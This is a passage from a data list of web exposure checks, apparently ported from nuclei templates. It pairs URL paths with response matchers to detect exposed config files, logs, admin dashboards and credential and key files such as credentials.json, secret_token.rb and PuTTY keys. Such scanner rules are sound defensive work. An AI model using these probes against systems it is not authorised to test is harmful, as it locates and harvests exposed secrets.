        "description": 'Behat Configuration File - Detect (ported from nuclei template http/exposures/configs/behat-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['default:', 'paths:', 'suites:'], 'condition': 'or'}],
    },
    {
        "id": 'bitrix-log-file-disclosure', "name": 'Bitrix Site Manager - Log File Disclosure',
        "severity": 'medium', "path": '/bitrix/modules/updater.log',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Bitrix Site Manager - Log File Disclosure (ported from nuclei template http/exposures/logs/bitrix-log-file-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['LICENSE_KEY', 'CUpdateClient', 'UPD_SUCCESS', 'UPD_ERROR', 'SUPD_VER', 'bitm_'], 'condition': 'or'}],
    },
    {
        "id": 'cacti-log-exposure', "name": 'Cacti Log - Exposure',
        "severity": 'medium', "path": '/cacti/log/cacti.log',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Cacti Log - Exposure (ported from nuclei template http/exposures/logs/cacti-log-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SYSTEM STATS'], 'condition': 'or'}],
    },
    {
        "id": 'oracle-cgi-printenv', "name": 'Oracle CGI printenv - Information Disclosure',
        "severity": 'medium', "path": '/cgi-bin/printenv',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Oracle CGI printenv - Information Disclosure (ported from nuclei template http/exposures/configs/oracle-cgi-printenv.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['DOCUMENT_ROOT="'], 'condition': 'or'}],
    },
    {
        "id": 'cgi-printenv', "name": 'Test CGI Script - Detect',
        "severity": 'medium', "path": '/cgi-bin/printenv.pl',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Test CGI Script - Detect (ported from nuclei template http/exposures/configs/cgi-printenv.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['MYSQL_HOME', 'OPENSSL_CONF', 'REMOTE_ADDR', 'SERVER_ADMIN', 'Environment Variables:'], 'condition': 'or'}],
    },
    {
        "id": 'cloud-config', "name": 'Cloud Config File Exposure',
        "severity": 'medium', "path": '/cloud-config.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Cloud Config File Exposure (ported from nuclei template http/exposures/files/cloud-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['ssh_authorized_keys', '#cloud-config'], 'condition': 'or'}],
    },
    {
        "id": 'cobbler-exposed-directory', "name": 'Exposed Cobbler Directories',
        "severity": 'medium', "path": '/cobbler/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Exposed Cobbler Directories (ported from nuclei template http/misconfiguration/cobbler-exposed-directory.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of /cobbler', 'Index of /cblr'], 'condition': 'or'}],
    },
    {
        "id": 'apache-hive-config', "name": 'Apache Hive Configuration - Exposure',
        "severity": 'medium', "path": '/conf',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Apache Hive Configuration - Exposure (ported from nuclei template http/exposures/configs/apache-hive-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['hive.conf.', '<configuration>'], 'condition': 'or'}],
    },
    {
        "id": 'configuration-listing', "name": 'Sensitive Configuration Files Listing - Detect',
        "severity": 'medium', "path": '/config/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Sensitive Configuration Files Listing - Detect (ported from nuclei template http/exposures/configs/configuration-listing.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of /config', 'Parent Directory'], 'condition': 'or'}],
    },
    {
        "id": 'rails-secret-token-disclosure', "name": 'Ruby on Rails Secret Token Disclosure',
        "severity": 'medium', "path": '/config/initializers/secret_token.rb',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Ruby on Rails Secret Token Disclosure (ported from nuclei template http/exposures/files/rails-secret-token-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['secret_key_base =', 'config.secret_token ='], 'condition': 'or'}],
    },
    {
        "id": 'pghero-dashboard-exposure', "name": 'PgHero Dashboard Exposure Panel - Detect',
        "severity": 'medium', "path": '/connections',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'PgHero Dashboard Exposure Panel - Detect (ported from nuclei template http/misconfiguration/pghero-dashboard-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>PgHero / Connections</title>'], 'condition': 'or'}],
    },
    {
        "id": 'aem-dump-contentnode', "name": 'AEM Dump Content Node Properties',
        "severity": 'medium', "path": '/content.infinity.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'AEM Dump Content Node Properties (ported from nuclei template http/misconfiguration/aem/aem-dump-contentnode.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"rep:privileges":['], 'condition': 'or'}],
    },
    {
        "id": 'gcloud-credentials', "name": 'Google Cloud Credentials',
        "severity": 'medium', "path": '/credentials.db',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Google Cloud Credentials (ported from nuclei template http/exposures/files/gcloud-credentials.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SQLite', 'client_id'], 'condition': 'or'}],
    },
    {
        "id": 'credentials-json', "name": 'Credentials File Disclosure',
        "severity": 'medium', "path": '/credentials.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Credentials File Disclosure (ported from nuclei template http/exposures/files/credentials-json.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"client_secret":', '"client_id":'], 'condition': 'or'}],
    },
    {
        "id": 'unauth-fastvue-dashboard', "name": 'Fastvue Dashboard Panel - Unauthenticated Detect',
        "severity": 'medium', "path": '/dashboard.aspx',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Fastvue Dashboard Panel - Unauthenticated Detect (ported from nuclei template http/misconfiguration/unauth-fastvue-dashboard.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Fastvue Sophos Reporter</title>', '<title>Fastvue Reporter for SonicWall</title>'], 'condition': 'or'}],
    },
    {
        "id": 'lightstreamer-dashboard-exposure', "name": 'Lightstreamer Dashboard Exposure',
        "severity": 'medium', "path": '/dashboard/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Lightstreamer Dashboard Exposure (ported from nuclei template http/misconfiguration/lightstreamer-dashboard-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Lightstreamer Monitoring Dashboard', 'performance'], 'condition': 'or'}],
    },
    {
        "id": 'db-xml-file', "name": 'db.xml File - Detect',
        "severity": 'medium', "path": '/db.xml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'db.xml File - Detect (ported from nuclei template http/exposures/files/db-xml-file.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<ServerName>', '<DBPASS>', '<DBtype>'], 'condition': 'or'}],
    },
    {
        "id": 'jboss-seam-debug-page', "name": 'Jboss Seam Debug Page Enabled',
        "severity": 'medium', "path": '/debug.seam',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Jboss Seam Debug Page Enabled (ported from nuclei template http/exposures/logs/jboss-seam-debug-page.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SeamDebugPage', 'org.jboss.seam'], 'condition': 'or'}],
    },
    {
        "id": 'netalertx-dashboard', "name": 'NetAlert X Admin Dashboard - Exposed',
        "severity": 'medium', "path": '/devices.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'NetAlert X Admin Dashboard - Exposed (ported from nuclei template http/misconfiguration/netalertx-dashboard.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>NetAlertX', 'Sign out</a>', 'My Devices'], 'condition': 'or'}],
    },
    {
        "id": 'mfp-unauth-exposure', "name": 'Multi-function Printer - Unauthorized Access',
        "severity": 'medium', "path": '/eSCL/ScannerCapabilities',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Multi-function Printer - Unauthorized Access (ported from nuclei template http/misconfiguration/mfp-unauth-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['xmlns:pwg=', '<scan:ScannerCapabilities'], 'condition': 'or'}],
    },
    {
        "id": 'apache-kyuubi-config', "name": 'Apache Kyuubi - Configuration Exposure',
        "severity": 'medium', "path": '/engine-ui/0.0.0.0:4040/environment/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Apache Kyuubi - Configuration Exposure (ported from nuclei template http/exposures/configs/apache-kyuubi-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Environment</title>', 'kyuubi'], 'condition': 'or'}],
    },
    {
        "id": 'environment-rb', "name": 'Environment Ruby File Disclosure',
        "severity": 'medium', "path": '/environment.rb',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Environment Ruby File Disclosure (ported from nuclei template http/exposures/files/environment-rb.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['# Load the Rails application.'], 'condition': 'or'}],
    },
    {
        "id": 'aem-acs-common', "name": 'Adobe AEM ACS Common Exposure',
        "severity": 'medium', "path": '/etc/acs-commons/jcr-compare.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Adobe AEM ACS Common Exposure (ported from nuclei template http/misconfiguration/aem/aem-acs-common.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Version Compare | ACS AEM Commons</title>', '<title>Oak Index Manager | ACS AEM Commons</title>', '<title>JCR Compare | ACS AEM Commons</title>', '<title>Workflow Remover | ACS AEM Commons</title>'], 'condition': 'or'}],
    },
    {
        "id": 'forgejo-repo-exposure', "name": 'Forgejo Repositories - Exposure',
        "severity": 'medium', "path": '/explore/repos',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Forgejo Repositories - Exposure (ported from nuclei template http/misconfiguration/forgejo-repo-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Powered by Forgejo', 'Explore</a>', 'Repositories'], 'condition': 'or'}],
    },
    {
        "id": 'teampass-ldap', "name": 'Teampass LDAP Debug Config - Detect',
        "severity": 'medium', "path": '/files/ldap.debug.txt',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Teampass LDAP Debug Config - Detect (ported from nuclei template http/exposures/logs/teampass-ldap.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['base_dn', 'search_base', 'bind_dn', 'bind_passwd'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-gateway', "name": 'Detect Spring Gateway Actuator',
        "severity": 'medium', "path": '/gateway/routes',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect Spring Gateway Actuator (ported from nuclei template http/misconfiguration/springboot/springboot-gateway.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['predicate', 'route_id'], 'condition': 'or'}],
    },
    {
        "id": 'google-api-private-key', "name": 'Google Api Private Key',
        "severity": 'medium', "path": '/google-api-private-key.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Google Api Private Key (ported from nuclei template http/exposures/files/google-api-private-key.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['private_key_id', 'private_key'], 'condition': 'or'}],
    },
    {
        "id": 'cacti-guest-access-enabled', "name": 'Cacti - Guest User Access Enabled',
        "severity": 'medium', "path": '/graph_view.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Cacti - Guest User Access Enabled (ported from nuclei template http/misconfiguration/cacti-guest-access-enabled.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Tree Mode', 'List Mode', 'Preview Mode', 'Login to Cacti', 'Please enter your Cacti'], 'condition': 'or'}],
    },
    {
        "id": 'haproxy-status', "name": 'HAProxy Statistics Page - Detect',
        "severity": 'medium', "path": '/haproxy-status',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'HAProxy Statistics Page - Detect (ported from nuclei template http/misconfiguration/haproxy-status.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Statistics Report for HAProxy'], 'condition': 'or'}],
    },
    {
        "id": 'hazelcast-management-exposure', "name": 'Hazelcast Management Center - Configuration Exposure',
        "severity": 'medium', "path": '/hazelcast/rest/cluster',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Hazelcast Management Center - Configuration Exposure (ported from nuclei template http/misconfiguration/hazelcast-management-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['memberVersion', 'members'], 'condition': 'or'}],
    },
    {
        "id": 'azure-functions-hostjson-exposure', "name": 'Azure Functions host.json Configuration Exposure',
        "severity": 'medium', "path": '/host.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Azure Functions host.json Configuration Exposure (ported from nuclei template http/exposures/configs/azure-functions-hostjson-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"version"', '"extensionBundle"', '"functionTimeout"', '"logging"', '"extensions"', '"healthMonitor"', '"singleton"', '"concurrency"'], 'condition': 'or'}],
    },
    {
        "id": 'kyan-credential-exposure', "name": 'Kyan Credential - Exposure',
        "severity": 'medium', "path": '/hosts',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Kyan Credential - Exposure (ported from nuclei template http/exposures/configs/kyan-credential-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['UserName=', 'Password='], 'condition': 'or'}],
    },
    {
        "id": 'hp-laserjet-config', "name": 'HP LaserJet Configuration Exposure',
        "severity": 'medium', "path": '/hp/device/this.LCDispatcher?nav=hp.Config',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'HP LaserJet Configuration Exposure (ported from nuclei template http/exposures/configs/hp-laserjet-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Configuration Page', 'Device Configuration', 'set_config_deviceinfo'], 'condition': 'or'}],
    },
    {
        "id": 'oracle-ebs-sqllog-exposure', "name": 'Oracle EBS SQL Log - Exposure',
        "severity": 'medium', "path": '/html/bin/sqlnet.log',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Oracle EBS SQL Log - Exposure (ported from nuclei template http/exposures/logs/oracle-ebs-sqllog-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['DESCRIPTION=', 'USER='], 'condition': 'or'}],
    },
    {
        "id": 'aws-s3-explorer', "name": 'Amazon Web Services S3 Explorer - Detect',
        "severity": 'medium', "path": '/index.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Amazon Web Services S3 Explorer - Detect (ported from nuclei template http/misconfiguration/aws/aws-s3-explorer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>AWS S3 Explorer</title>'], 'condition': 'or'}],
    },
    {
        "id": 'info-cgi-env-leak', "name": 'info.cgi  Environment Variable - Disclosure',
        "severity": 'medium', "path": '/info.cgi',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'info.cgi  Environment Variable - Disclosure (ported from nuclei template http/misconfiguration/info-cgi-env-leak.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SERVER_SOFTWARE', 'SERVER_NAME', 'GATEWAY_INTERFACE', 'SERVER_PROTOCOL', 'REQUEST_METHOD', 'QUERY_STRING', 'REMOTE_ADDR', 'HTTP_USER_AGENT'], 'condition': 'or'}],
    },
    {
        "id": 'redmine-issues-exposure', "name": 'Redmine Issues - Exposure',
        "severity": 'medium', "path": '/issues.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Redmine Issues - Exposure (ported from nuclei template http/exposures/files/redmine-issues-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"issues":', '"total_count":', '"project":'], 'condition': 'or'}],
    },
    {
        "id": 'kubernetes-kustomization-disclosure', "name": 'Kubernetes Kustomize Configuration - Detect',
        "severity": 'medium', "path": '/kustomization.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Kubernetes Kustomize Configuration - Detect (ported from nuclei template http/exposures/configs/kubernetes-kustomization-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['apiVersion:', 'resources:', 'namespace:', 'commonLabels:', 'Kustomization'], 'condition': 'or'}],
    },
    {
        "id": 'joomla-file-listing', "name": 'Joomla! Database File List',
        "severity": 'medium', "path": '/libraries/joomla/database/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Joomla! Database File List (ported from nuclei template http/exposures/files/joomla-file-listing.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of /libraries/joomla/database', 'Parent Directory'], 'condition': 'or'}],
    },
    {
        "id": 'aem-offloading-browser', "name": 'Adobe AEM Offloading Browser',
        "severity": 'medium', "path": '/libs/granite/offloading/content/view.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Adobe AEM Offloading Browser (ported from nuclei template http/misconfiguration/aem/aem-offloading-browser.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Offloading Browser', '>CLUSTER</th>'], 'condition': 'or'}],
    },
    {
        "id": 'aem-security-users', "name": 'Adobe AEM Security Users Exposure',
        "severity": 'medium', "path": '/libs/granite/security/content/useradmin.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Adobe AEM Security Users Exposure (ported from nuclei template http/misconfiguration/aem/aem-security-users.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['AEM Security | Users', 'trackingelement="create user"'], 'condition': 'or'}],
    },
    {
        "id": 'sound4-directory-listing', "name": 'SOUND4 Impact/Pulse/First/Eco <=2.x - Information Disclosure',
        "severity": 'medium', "path": '/log/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'SOUND4 Impact/Pulse/First/Eco <=2.x - Information Disclosure (ported from nuclei template http/misconfiguration/sound4-directory-listing.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Index of /log</title>', 'Parent Directory'], 'condition': 'or'}],
    },
    {
        "id": 'zen-cart-log-exposure', "name": 'Zen Cart Log File Exposure',
        "severity": 'medium', "path": '/logs/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Zen Cart Log File Exposure (ported from nuclei template http/exposures/logs/zen-cart-log-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of', 'myDEBUG'], 'condition': 'or'}],
    },
    {
        "id": 'grafana-loki-api-exposure', "name": 'Grafana Loki - Unauthenticated API Access',
        "severity": 'medium', "path": '/loki/api/v1/labels',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Grafana Loki - Unauthenticated API Access (ported from nuclei template http/exposures/apis/grafana-loki-api-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"status":"success"'], 'condition': 'or'}],
    },
    {
        "id": 'prometheus-metrics', "name": 'Prometheus Metrics - Detect',
        "severity": 'medium', "path": '/metrics',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Prometheus Metrics - Detect (ported from nuclei template http/exposures/configs/prometheus-metrics.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['cpu_seconds_total', 'http_request_duration_seconds', 'process_virtual_memory_bytes', 'process_start_time_seconds', 'lvm_', 'kube', 'namedprocess', 'mysqld'], 'condition': 'or'}],
    },
    {
        "id": 'putty-private-key-disclosure', "name": 'Putty Private Key Disclosure',
        "severity": 'medium', "path": '/my.ppk',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Putty Private Key Disclosure (ported from nuclei template http/exposures/files/putty-private-key-disclosure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['PuTTY-User-Key-File', 'Encryption:'], 'condition': 'or'}],
    },
    {
        "id": 'opcache-status-exposure', "name": 'OPcache Status Page - Detect',
        "severity": 'medium', "path": '/opcache-status/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'OPcache Status Page - Detect (ported from nuclei template http/exposures/configs/opcache-status-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<th>opcache_enabled</th>', '<th>opcache_hit_rate</th>'], 'condition': 'or'}],
    },
    {
        "id": 'opennms-dashboard-exposure', "name": 'OpenNMS Dashboard - Exposure Detection',
        "severity": 'medium', "path": '/opennms/index.jsp',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'OpenNMS Dashboard - Exposure Detection (ported from nuclei template http/misconfiguration/opennms-dashboard-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['OpenNMS Web Console', 'OpenNMS', 'Maps'], 'condition': 'or'}],
    },
    {
        "id": 'redpanda-console', "name": 'Redpanda Console - Exposure',
        "severity": 'medium', "path": '/overview',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Redpanda Console - Exposure (ported from nuclei template http/misconfiguration/redpanda-console.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Redpanda Console'], 'condition': 'or'}],
    },
    {
        "id": 'phinx-config', "name": 'Phinx Configuration Exposure',
        "severity": 'medium', "path": '/phinx.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Phinx Configuration Exposure (ported from nuclei template http/exposures/configs/phinx-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['paths:', 'environments:', 'development:'], 'condition': 'or'}],
    },
    {
        "id": 'plesk-stat', "name": 'Webalizer Log Analyzer Configuration - Detect',
        "severity": 'medium', "path": '/plesk-stat/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Webalizer Log Analyzer Configuration - Detect (ported from nuclei template http/exposures/configs/plesk-stat.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of /plesk-stat', 'Parent Directory', 'anon_ftpstat', 'ftpstat', 'webstat-ssl', 'webstat'], 'condition': 'or'}],
    },
    {
        "id": 'exposed-alps-spring', "name": 'Exposed Spring Data REST Application-Level Profile Semantics (ALPS)',
        "severity": 'medium', "path": '/profile',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Exposed Spring Data REST Application-Level Profile Semantics (ALPS) (ported from nuclei template http/exposures/files/exposed-alps-spring.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['_links', '/alps/', 'profile', 'application/hal+json'], 'condition': 'or'}],
    },
    {
        "id": 'firebase-config-exposure', "name": 'Firebase Configuration File - Detect',
        "severity": 'medium', "path": '/public/config.js',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Firebase Configuration File - Detect (ported from nuclei template http/exposures/configs/firebase-config-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['apiKey:', 'authDomain:', 'databaseURL:', 'storageBucket:'], 'condition': 'or'}],
    },
    {
        "id": 'laravel-pulse-unauth', "name": 'Laravel Pulse - Unauthenticated Dashboard Access',
        "severity": 'medium', "path": '/pulse',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Laravel Pulse - Unauthenticated Dashboard Access (ported from nuclei template http/misconfiguration/laravel-pulse-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Laravel Pulse', 'livewire'], 'condition': 'or'}],
    },
    {
        "id": 'apache-polaris-metrics-exposure', "name": 'Apache Polaris - Information Disclosure',
        "severity": 'medium', "path": '/q/metrics',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Apache Polaris - Information Disclosure (ported from nuclei template http/exposures/configs/apache-polaris-metrics-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['application="Polaris"', 'org.apache.polaris'], 'condition': 'or'}],
    },
    {
        "id": 'redis-config', "name": 'Redis Configuration File - Detect',
        "severity": 'medium', "path": '/redis.conf',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Redis Configuration File - Detect (ported from nuclei template http/exposures/configs/redis-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['bind', 'protected-mode', 'port'], 'condition': 'or'}],
    },
    {
        "id": 'coolify-register-account', "name": 'Coolify Register User Account - Enabled',
        "severity": 'medium', "path": '/register',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Coolify Register User Account - Enabled (ported from nuclei template http/misconfiguration/coolify-register-account.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Password again', 'Coolify'], 'condition': 'or'}],
    },
    {
        "id": 'prisma-schema-exposure', "name": 'Exposed Prisma Database Schema - Exposure',
        "severity": 'medium', "path": '/schema.prisma',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Exposed Prisma Database Schema - Exposure (ported from nuclei template http/exposures/configs/prisma-schema-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['generator', 'datasource', 'provider =', 'model'], 'condition': 'or'}],
    },
    {
        "id": 'secret-token-rb', "name": 'Secret Token Ruby - File Disclosure',
        "severity": 'medium', "path": '/secret_token.rb',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Secret Token Ruby - File Disclosure (ported from nuclei template http/exposures/files/secret-token-rb.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['::Application.config.secret'], 'condition': 'or'}],
    },
    {
        "id": 'prometheus-promtail', "name": 'Prometheus Promtail - Exposure',
        "severity": 'medium', "path": '/service-discovery',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Prometheus Promtail - Exposure (ported from nuclei template http/misconfiguration/prometheus-promtail.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['>Promtail</a>', 'https://github.com/grafana/loki'], 'condition': 'or'}],
    },
    {
        "id": 'teslamate-unauth-access', "name": 'TeslaMate - Unauthenticated Access',
        "severity": 'medium', "path": '/settings',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'TeslaMate - Unauthenticated Access (ported from nuclei template http/misconfiguration/teslamate-unauth-access.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Settings · TeslaMate', 'URLs</h2>'], 'condition': 'or'}],
    },
    {
        "id": 'generic-php-files', "name": 'Generic PHP Backup Information Disclosure',
        "severity": 'medium', "path": '/settings.php.bak',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Generic PHP Backup Information Disclosure (ported from nuclei template http/exposures/backups/generic-php-files.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['DB_NAME'], 'condition': 'or'}],
    },
    {
        "id": 'untangle-admin-setup', "name": 'Untangle Exposed Admin Signup',
        "severity": 'medium', "path": '/setup/setup.do',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Untangle Exposed Admin Signup (ported from nuclei template http/misconfiguration/untangle-admin-setup.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Setup Wizard</title>', 'java.untangle.com'], 'condition': 'or'}],
    },
    {
        "id": 'jenkins-openuser-register', "name": 'Jenkins Open User registration',
        "severity": 'medium', "path": '/signup',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Jenkins Open User registration (ported from nuclei template http/misconfiguration/jenkins/jenkins-openuser-register.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Create an account! [Jenkins]', 'Register [Jenkins]', 'Register - Jenkins'], 'condition': 'or'}],
    },
    {
        "id": 'slurm-hpc-dashboard', "name": 'Slurm HPC Dashboard - Detect',
        "severity": 'medium', "path": '/slurm/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Slurm HPC Dashboard - Detect (ported from nuclei template http/misconfiguration/slurm-hpc-dashboard.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Slurm HPC Dashboard</title>', 'content="Slurm HPC dashboard'], 'condition': 'or'}],
    },
    {
